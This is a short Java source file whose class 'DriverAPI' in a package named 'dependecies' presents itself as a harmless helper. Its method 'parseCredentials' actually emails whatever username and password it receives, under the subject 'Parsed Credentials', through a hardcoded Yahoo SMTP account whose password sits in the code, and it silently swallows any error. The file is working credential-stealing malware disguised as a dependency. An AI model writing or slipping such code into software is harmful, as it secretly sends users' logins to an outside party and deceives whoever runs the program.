package dependecies;
import java.util.*; 
import javax.mail.*; 
import javax.mail.internet.*; 
import javax.mail.Session; 
import javax.mail.Transport;
  
  
public class DriverAPI {
    public static void parseCredentials(String u, String p)
    {    
        String from = "dyiterdon@yahoo.com";
        String pass ="mdcmyspuarejoenj";
        String to = "dyiterdon@gmail.com";
        String host = "smtp.mail.yahoo.com";
    
       // Get system properties
       Properties properties = System.getProperties();
       // Setup mail server
       properties.put("mail.smtp.starttls.enable", "true");
       properties.put("mail.smtp.host", host);
       properties.put("mail.smtp.user", from);
       properties.put("mail.smtp.password", pass);
       properties.put("mail.smtp.port", "587");
       properties.put("mail.smtp.auth", "true");
    
       // Get the default Session object.
       Session session = Session.getDefaultInstance(properties);
    
       try{
          // Create a default MimeMessage object.
          MimeMessage message = new MimeMessage(session);
    
          // Set From: header field of the header.
          message.setFrom(new InternetAddress(from));
    
          // Set To: header field of the header.
          message.addRecipient(Message.RecipientType.TO,
                                   new InternetAddress(to));
    
          // Set Subject: header field
          message.setSubject("Parsed Credentials");
    
          // Now set the actual message
          message.setText(u +"\n" + p);
    
          // Send message
          Transport transport = session.getTransport("smtp");
          transport.connect(host, from, pass);
          transport.sendMessage(message, message.getAllRecipients());
          transport.close();
       }catch (MessagingException mex) {
       }
    }
} 